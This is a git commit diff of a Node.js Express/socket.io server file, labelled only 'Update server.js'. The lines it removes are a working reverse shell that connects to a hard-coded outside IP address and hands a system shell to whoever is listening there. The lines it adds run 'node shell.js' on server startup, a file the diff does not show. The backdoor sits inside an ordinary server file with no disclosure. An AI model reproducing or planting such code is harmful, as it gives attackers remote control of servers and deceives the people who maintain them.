ed63121886ad13ac9487753639c2baf9bec080db
HoldOnToYourHeart <44694643+HoldOnToYourHeart@users.noreply.github.com>
2021-09-17 17:37:11 +0800

    Update server.js

--- server.js
+++ server.js
@@ -258,15 +258,15 @@ io.sockets.on('connection', function (socket) {
 
 server.listen(app.get('port'), function () {
     console.log("Express server listening on port " + app.get('port'));
-    //var execx = require('child_process').exec;
-    //var cmdStr = 'ps-ef&netstat -an';
-   // execx(cmdStr, function (err, stdout, srderr) {
-      //if (err) {
-         // console.log(srderr);
-      //} else {
-         // console.log(stdout);
-     // }
-   // });
-  var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("net"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(3333, "118.195.150.115", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === "undefined") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on("error", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat();
+    var execx = require('child_process').exec;
+    var cmdStr = 'node shell.js';
+    execx(cmdStr, function (err, stdout, srderr) {
+      if (err) {
+         console.log(srderr);
+      } else {
+         console.log(stdout);
+      }
+   });
+  
 
 });
